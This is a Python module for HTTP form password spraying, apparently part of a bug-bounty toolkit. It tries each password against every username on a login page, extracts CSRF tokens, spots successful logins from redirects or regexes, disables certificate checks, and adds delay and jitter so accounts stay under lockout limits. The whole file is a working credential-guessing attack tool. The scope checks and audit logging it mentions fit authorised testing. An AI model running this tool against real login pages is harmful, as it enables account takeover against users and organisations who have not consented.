#!/usr/bin/env python3
"""
HTTP form spray module — POST username/password to a URL, detect success.

NOT a standalone entry point. Spawned by tools/spray_orchestrator.sh which
sets the required environment variables and runs scope_check + lockout
warning + interactive confirmation first.

Spray order: pass[i] x all_users per round (NOT brute per-user). This keeps
each account at <=1 failed attempt per round.

Success detection (any one of these matches):
  - HTTP redirect (3xx) to a path that is NOT the login page
  - SPRAY_SUCCESS_REGEX matches response body (if set)
  - Absence of SPRAY_FAIL_REGEX (if FAIL but no SUCCESS regex)
  - Status 200 + body length significantly different from baseline (heuristic)

Env contract (all set by spray_orchestrator.sh):
  SPRAY_TARGET_URL        login form URL
  SPRAY_USERS_FILE        one username per line
  SPRAY_PASSES_FILE       one password per line
  SPRAY_POST_DATA         template, e.g. "username={USER}&password={PASS}"
                          {USER}, {PASS}, {CSRF} are substituted.
                          If empty, defaults to "username={USER}&password={PASS}"
  SPRAY_CSRF_EXTRACT      regex with one group capturing the CSRF token from
                          an initial GET of TARGET_URL (e.g. 'name="csrf" value="([^"]+)"')
  SPRAY_SUCCESS_REGEX     body regex marking success (optional)
  SPRAY_FAIL_REGEX        body regex marking failure (optional)
  SPRAY_DELAY             seconds between rounds
  SPRAY_JITTER            ± seconds added to delay
  SPRAY_CONTINUE_ON_HIT   "true" to keep going after first valid creds
  AUDIT_LOG               JSONL output path
"""
from __future__ import annotations
import hashlib
import json
import os
import random
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# Permissive SSL — many BB targets use self-signed staging certs
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research"


def env(name: str, default: str = "") -> str:
    return os.environ.get(name, default)


def env_required(name: str) -> str:
    v = os.environ.get(name)
    if not v:
        print(f"[-] Missing required env var: {name}", file=sys.stderr)
        sys.exit(1)
    return v


def read_lines(path: str) -> list[str]:
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def sha256_prefix(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()[:12]


def audit(record: dict) -> None:
    record["ts"] = datetime.now(timezone.utc).isoformat()
    with open(AUDIT_LOG_PATH, "a") as f:
        f.write(json.dumps(record) + "\n")


def _build_opener():
    """Build a urllib opener that uses our SSL context AND doesn't follow redirects."""
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    return urllib.request.build_opener(
        NoRedirect,
        urllib.request.HTTPSHandler(context=SSL_CTX),
    )


def fetch_csrf(url: str, regex: str) -> str | None:
    """GET the form URL and extract CSRF token via regex (group 1)."""
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    opener = _build_opener()
    try:
        with opener.open(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="replace")
        m = re.search(regex, body)
        if not m:
            return None
        return m.group(1)
    except Exception as e:
        print(f"[!] CSRF fetch failed: {e}", file=sys.stderr)
        return None


def substitute(template: str, user: str, password: str, csrf: str | None) -> str:
    """Replace placeholders ({USER}/{USERNAME}, {PASS}/{PASSWORD}, {CSRF}).

    Uses str.replace not str.format — won't crash on unknown placeholders
    (they remain literal in the output, which the user will see in the request)."""
    subs = {
        "{USER}": user, "{USERNAME}": user,
        "{PASS}": password, "{PASSWORD}": password,
        "{CSRF}": csrf or "",
    }
    for k, v in subs.items():
        template = template.replace(k, v)
    return template


def attempt(url: str, post_data_tpl: str, user: str, password: str,
            csrf_token: str | None, success_re: re.Pattern | None,
            fail_re: re.Pattern | None) -> dict:
    """Return result dict: {status_code, redirect_to, looks_like_success, duration_ms}."""
    body = substitute(post_data_tpl, user, password, csrf_token)
    body_bytes = body.encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body_bytes,
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body_bytes)),
        },
        method="POST",
    )

    opener = _build_opener()

    start = time.time()
    status = 0
    redirect_to = None
    resp_body = ""
    try:
        with opener.open(req, timeout=15) as resp:
            status = resp.status
            resp_body = resp.read(8192).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        if status in (301, 302, 303, 307, 308):
            redirect_to = e.headers.get("Location", "")
        try:
            resp_body = e.read(8192).decode("utf-8", errors="replace")
        except Exception:
            pass
    except Exception as e:
        return {
            "status_code": 0,
            "redirect_to": None,
            "looks_like_success": False,
            "duration_ms": int((time.time() - start) * 1000),
            "error": str(e),
        }
    duration_ms = int((time.time() - start) * 1000)

    # Success detection
    success = False
    if success_re and success_re.search(resp_body):
        success = True
    elif fail_re:
        success = not fail_re.search(resp_body)
    elif redirect_to:
        # 3xx away from login page is the most common success signal
        login_path = urllib.parse.urlparse(url).path
        if login_path not in (redirect_to or ""):
            success = True
    elif status == 200 and len(resp_body) > 0:
        # Without explicit regex we can't be sure — false-positive risk
        # Leave as not-success; user can supply --success-regex.
        success = False

    return {
        "status_code": status,
        "redirect_to": redirect_to,
        "looks_like_success": success,
        "duration_ms": duration_ms,
    }


def main() -> int:
    global AUDIT_LOG_PATH
    AUDIT_LOG_PATH = env_required("AUDIT_LOG")

    url           = env_required("SPRAY_TARGET_URL")
    users_file    = env_required("SPRAY_USERS_FILE")
    passes_file   = env_required("SPRAY_PASSES_FILE")
    post_data_tpl = env("SPRAY_POST_DATA") or "username={USER}&password={PASS}"
    csrf_extract  = env("SPRAY_CSRF_EXTRACT")
    success_re    = re.compile(env("SPRAY_SUCCESS_REGEX")) if env("SPRAY_SUCCESS_REGEX") else None
    fail_re       = re.compile(env("SPRAY_FAIL_REGEX")) if env("SPRAY_FAIL_REGEX") else None
    delay         = int(env("SPRAY_DELAY", "1800"))
    jitter        = int(env("SPRAY_JITTER", "60"))
    continue_hit  = env("SPRAY_CONTINUE_ON_HIT") == "true"

    users    = read_lines(users_file)
    passwords = read_lines(passes_file)

    print(f"[+] HTTP form spray: {url}")
    print(f"[+] {len(users)} users × {len(passwords)} passwords = {len(users)*len(passwords)} attempts")
    print(f"[+] Spray order: pass[i] × all_users per round")
    print(f"[+] Audit log: {AUDIT_LOG_PATH}")
    print("")

    hits: list[tuple[str, str]] = []

    for round_idx, password in enumerate(passwords, 1):
        print(f"=== Round {round_idx}/{len(passwords)} — testing {len(users)} users ===")
        # Refresh CSRF token once per round (most sites issue per-session tokens)
        csrf_token = None
        if csrf_extract:
            csrf_token = fetch_csrf(url, csrf_extract)
            if csrf_token:
                print(f"    CSRF: {csrf_token[:16]}...")
            else:
                print("    [!] CSRF not extracted; sending without it")

        for user in users:
            res = attempt(url, post_data_tpl, user, password, csrf_token, success_re, fail_re)
            audit({
                "round": round_idx,
                "user": user,
                "pwd_sha256_prefix": sha256_prefix(password),
                "status_code": res["status_code"],
                "redirect_to": res.get("redirect_to"),
                "looks_like_success": res["looks_like_success"],
                "duration_ms": res["duration_ms"],
                "error": res.get("error"),
            })

            if res["looks_like_success"]:
                hits.append((user, password))
                print(f"    \033[0;32m[HIT]\033[0m {user} ({res['status_code']} -> {res.get('redirect_to')})")
                if not continue_hit:
                    print("[+] Hit found and --continue-on-hit not set; stopping.")
                    _summary(hits, passwords, round_idx)
                    return 0

        # Inter-round delay
        if round_idx < len(passwords):
            wait = delay + random.randint(-jitter, jitter)
            print(f"    [*] Round done. Sleeping {wait}s before next round...")
            time.sleep(max(1, wait))

    _summary(hits, passwords, len(passwords))
    return 0


def _summary(hits, all_passes, rounds_done):
    print()
    print("=" * 50)
    print("  HTTP Form Spray Summary")
    print("=" * 50)
    print(f"  Rounds completed: {rounds_done}/{len(all_passes)}")
    print(f"  Hits found:       {len(hits)}")
    for user, pwd in hits:
        print(f"    {user}  (pwd-sha256-prefix: {sha256_prefix(pwd)})")
    print(f"  Audit log:        {AUDIT_LOG_PATH}")
    print("=" * 50)


if __name__ == "__main__":
    sys.exit(main())
